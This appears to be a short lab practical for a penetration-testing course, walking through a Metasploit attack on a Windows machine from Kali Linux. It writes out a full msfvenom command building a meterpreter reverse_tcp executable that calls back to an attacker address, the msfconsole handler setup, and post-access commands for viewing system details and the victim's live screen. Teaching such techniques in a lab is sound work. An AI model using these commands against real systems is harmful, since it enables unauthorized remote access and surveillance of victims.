Practical_10: Exploiting with Metasploit (Kali Linux)
• Identify a vulnerable system and exploit it using Metasploit modules.
• Gain unauthorized access to the target system and execute commands or extract information.
• Understand the ethical considerations and legal implications of using Metasploit for penetration testing.
-----------------------
Open the terminal in Kali Linux as root and use the following command: apt-get update && apt-get upgrade
Check the IP addresses of both the systems (hacker and victim):
Ping the victim system to check connection
Now we will create a payload (hack.exe) by typing the following command:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.76 LPORT=4441 -f exe -o hack.exe
After creating payload, we will launch Metasploit with the following command: msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 192.168.2.76
> set LPORT 4441
> exploit
Now run hack.exe in the victim’s system after turning off the windows firewall and other security settings.
We will use the command sysinfo to check the system information of the victim’s system.
We can also use the screenshare command to see the live screen of the victim’s system
